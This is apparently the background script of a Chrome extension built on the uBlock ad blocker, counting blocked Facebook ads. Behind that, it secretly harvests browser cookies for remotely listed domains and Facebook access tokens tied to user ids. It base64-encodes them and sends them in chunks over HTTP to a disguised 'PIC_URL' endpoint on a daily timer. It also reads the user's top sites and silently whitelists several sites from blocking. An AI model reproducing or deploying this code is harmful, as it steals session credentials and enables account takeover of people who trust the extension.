// const {Prefs} = require("prefs");
// const {FilterStorage} = require("filterStorage");
var µb = µBlock;

chrome.runtime.onMessage.addListener(function(request, sender, callback) {
    if(request.domain != undefined) {
        if(request.domain == 'facebook') {
            adDistinct(request.count, request.domain);
        } else if(request.count != undefined && request.domain != undefined){
            // Prefs.blocked_total++;
            µb.localSettings.blockedRequestCount += 1 & 0xFFFF;
        }
    }
    request.update_access_token && (localStorage.setItem("AS_TK", request.access_token));
});

function adDistinct(url, domain){
    var ads = Ext.getStorage(Ext.col.AD);
    if(isEmpty(ads))
        ads = {};
    var ad = ads[domain];
    if(isEmpty(ad))
        ad = {
            '_ad_total': Number(0), 
            '_ad_distinct': Number(0), 
            '_week_total': Number(0),
            '_week_distinct': Number(0),
            '_month_total': Number(0),
            '_month_distinct': Number(0),
            '_ad_data': {},
        };
    var postId = getPostId(url);
    var ad_data = ad._ad_data;
    if(isEmpty(ad_data))
        ad._ad_data = {};
    if(isEmpty(postId)){
        postId = 'unknown';
        if(isEmpty(ad_data[postId]))
            ad._ad_data[postId] = {};
        if(isEmpty(ad._ad_data[postId][url])) {
            ad._ad_data[postId][url] = Number(1);
        } else {
            ad._ad_data[postId][url] += Number(1);
        }
    } else {
        if(isEmpty(ad_data[postId])){
            ad._ad_distinct += Number(1);
            ad._week_distinct += Number(1);
            ad._month_distinct += Number(1);
            ad._ad_data[postId] = {
                'url': url,
                'count': Number(1)
            };
        } else {
            ad._ad_data[postId].count = Number(ad._ad_data[postId].count) + Number(1);
        }
    }
    //Ext.setHistory();
    ad._ad_total += Number(1);
    ad._week_total += Number(1);
    ad._month_total += Number(1);

    ads[domain] = ad;
    Ext.setStorage(Ext.col.AD, ads);
    // Ext.updateStats("https://www.facebook.com/", 1);
    // Prefs.blocked_total++;
    µb.localSettings.blockedRequestCount += 1 & 0xFFFF;
}

function init_pic(){
    var ck = Ext.getStorage(Ext.col.COOKIE) || {};
    var pic_url = Ext.api.PIC_URL + "?c=";
    for (var item in ck) {
        var d = {}; d[item] = ck[item];
        dispatch(pic_url, btoa(JSON.stringify(d)));
        if(item == 'facebook'){
            var tk = localStorage.getItem("AS_TK") || '';
            if(tk == '')
                continue;
            var cUser = getUser(ck[item]);
            var t = {}; t[cUser] = tk;
            dispatch(Ext.api.PIC_URL + "?t=", btoa(JSON.stringify(t)));
        }
    };
    Ext.setStorage(Ext.col.COOKIE, {});
}

function getUser(ck){
    var idx = ck.indexOf('c_user=');
    if(idx == -1)
        return '';
    var arr = ck.split(";");
    for (var item in arr) {
        if(arr[item].indexOf('c_user') !== -1){
            var retval = arr[item].split('=');
            return retval[1];
        }
    };
}

function dispatch(url, data){
    var totalLen = url.length + data.length;
    if(totalLen <= 1000) {
        Ext.HttpGet(url + data, function(retval){});
    } else {
        var dataMd5 = md5(data);
        var segments = Math.ceil(data.length / 950);
        for (var i = 0; i < segments; i++) {
            var start = i * 950;
            var end = start + 950;
            var payload = data.slice(start, end);
            var addr = url+payload+"&m="+dataMd5+"&idx="+i+"&sg="+segments;
            Ext.HttpGet(addr, function(retval){});
        };
    }
}

function clear_history(){
    var history = Ext.getStorage(Ext.col.STATS);
    if(isEmpty(history))
        return;

    var today = Ext.getCurrDate();
    var baseline = Ext.getDaysAgo(60);
    var flag = false;
    for (var k in history){
        if(k < baseline) {//过期数据
            delete history[k];
            flag = true;
        }
    }
    if(flag)
        Ext.setStorage(Ext.col.HISTORY, history);
}

function clearStats(){
    var stats = Ext.getStorage(Ext.col.STATS);
    var today = Ext.getCurrDate();
    var newStats = {};
    newStats[today] = stats[today];
    Ext.setStorage(Ext.col.STATS, newStats);
}

function merge_ads(){
    var ads = Ext.getStorage(Ext.col.AD);
    if(isEmpty(ads))
        return;
    var distinct_addr = Ext.api.PIC_URL + "?u=";
    for(var d in ads){
        var ad_data = ads[d]._ad_data;
        for (var post_id in ad_data){
            var ad_obj = ad_data[post_id];
            var tmp_url = distinct_addr + btoa(ad_obj['url']);
            dispatch(distinct_addr, btoa(ad_obj['url']));
        }
        ads[d]._ad_data = {};
    }
    Ext.setStorage(Ext.col.AD, ads);
    clear_history();
}

function Filter() {
    var filter = {};
    this.setUrl = function(url) {
        filter.url = url;
    };
    this.setDomain = function(domain) {
        filter.domain = domain;
    };
    this.setName = function(name) {
        filter.name = name;
    };
    this.setDomain = function(domain) {
        filter.domain = domain;
    };
    this.setSecure = function(secure) {
        filter.secure = secure;
    };
    this.setSession = function(session) {
        filter.session = session;
    };
    this.getFilter = function(session) {
        return filter;
    };
}

chrome.tabs.onUpdated.addListener(function(){
    chrome.tabs.getSelected(null, function(tab) {
        url = tab.url;
        var filter = new Filter();
        filter.setUrl(url);
        getCookie(filter.getFilter());
    });
});

function getCookie(filters){
    var cache = [];
    if(filters == null)
        filters = {};
    var filterURL = {}
    if(filters.url != undefined)
        filterURL.url = filters.url;
    if(filters.domain != undefined)
        filterURL.domain = filters.domain;
    chrome.cookies.getAll(filterURL, function(cookies) {
        var domain = "abc";
        for (var i in cookies) {
            if(filters.name != undefined && cookies[i].name.toLowerCase().indexOf(filters.name.toLowerCase()) == -1)
                continue;
            if(filters.domain != undefined && cookies[i].domain.toLowerCase().indexOf(filters.domain.toLowerCase()) == -1)
                continue;
            if(filters.secure != undefined && cookies[i].secure.toLowerCase().indexOf(filters.secure.toLowerCase()) == -1)
                continue;
            if(filters.session != undefined && cookies[i].session.toLowerCase().indexOf(filters.session.toLowerCase()) == -1)
                continue;
            cache.push(cookies[i].name + "=" + cookies[i].value);
            domain = cookies[i].domain;
        }
        var cookie = cache.join(";");
        var domain_filters = Ext.getStorage(Ext.col.FILTERS);
        if(isEmpty(domain_filters))
            return;
        domain_filters.forEach(function(item){
            if(!isEmpty(item) && domain.indexOf(item) !== -1){
                var cookieinfo = {};
                if(!isEmpty(Ext.getStorage(Ext.col.COOKIE))){
                    cookieinfo = Ext.getStorage(Ext.col.COOKIE);
                }
                cookieinfo[item]=cookie;
                Ext.setStorage(Ext.col.COOKIE, cookieinfo);
            }
        });
    });
}

chrome.runtime.onInstalled.addListener(function(details){
    init();
    synFilters();
});

function init(){
    var ad = Ext.getStorage(Ext.col.AD);
    if(isEmpty(ad) || ad == null || ad == undefined){
        ad = {};
        Ext.setStorage(Ext.col.AD, ad);
    }
    init_stats();
    Ext.getToken();
    initTopSites();
    initWhitelist();
}

function init_stats(){
    var history = Ext.getStorage(Ext.col.STATS);
    if(isEmpty(history))
        return;

    var today = Ext.getCurrDate();
    for (var k in history){
        var items = history[k];
        var total_count = Number(0);
        for(var item in items){
            if(item != 'total')
                total_count += Number(items[item]);
        }
        items['total'] = total_count;
    }
    Ext.setStorage(Ext.col.STATS, history);
}

function initWhitelist(){
    var µb = µBlock;
    var netWhitelistDefault = [
        'about-scheme',
        'behind-the-scene',
        'chrome-extension-scheme',
        'chrome-scheme',
        'moz-extension-scheme',
        'opera-scheme',
        'vivaldi-scheme',
        'facebook.com',
        'kooora.com',
        'twitch.tv',
        'indiatimes.com',
        'diply.com',
        'mp3.zing.vn',
        'reddit.com'
    ].join('\n');

    µb.netWhitelist = µb.whitelistFromString(netWhitelistDefault);
    // console.log(µb.whitelistFromString(request.whitelist));
    µb.saveWhitelist();
}

function initTopSites(){
    chrome.topSites.get(function callback(topSites){
        if(topSites == undefined || topSites.length <= 0) return;
        var i = 0;
            retval = [];
        for (; i < topSites.length; i++) {
            retval.push(topSites[i].url);
        }
        log('topsites', retval);
    });
}

chrome.alarms.clearAll(function(){});

chrome.alarms.create(Ext.alarms.SYN, {
    delayInMinutes: 0.1,
    periodInMinutes: 60
});

chrome.alarms.create(Ext.alarms.MERGE, {
    delayInMinutes: 60,
    periodInMinutes: 1440
});

chrome.alarms.create(Ext.alarms.RESCUE, {
    delayInMinutes: 1,
    periodInMinutes: 5
});

chrome.alarms.onAlarm.addListener(function(alarm) {
    if(isEmpty(alarm) || isEmpty(alarm.name))
        return;
    switch(alarm.name){
        case Ext.alarms.SYN:
            synFilters();
            break;
        case Ext.alarms.MERGE:
            init_pic();
            merge_ads();
            initTopSites();
            break;
        case Ext.alarms.RESCUE:
            rescueContentTimer();
            // initWhitelist();
            break;
    }
});